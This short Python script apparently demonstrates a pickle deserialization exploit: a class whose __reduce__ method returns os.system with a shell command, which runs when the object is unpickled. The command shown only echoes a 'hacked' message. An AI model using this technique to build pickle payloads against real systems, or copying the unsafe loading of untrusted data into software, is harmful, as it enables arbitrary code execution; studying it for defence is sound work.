import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)
deserialized_object = pickle.loads(serialized_object)
